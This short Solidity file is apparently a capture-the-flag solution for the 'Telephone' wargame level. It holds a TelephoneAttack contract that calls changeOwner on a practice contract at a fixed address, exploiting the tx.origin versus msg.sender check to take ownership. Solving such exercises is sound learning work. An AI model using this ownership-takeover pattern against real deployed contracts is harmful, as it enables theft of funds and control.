// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/Telephone.sol";

contract TelephoneAttack {
  Telephone telephone = Telephone(0xDC17C27Ae8bE831AF07CC38C02930007060020F4);

  function changeOwner(address _owner) public {
    telephone.changeOwner(_owner);
  }
}
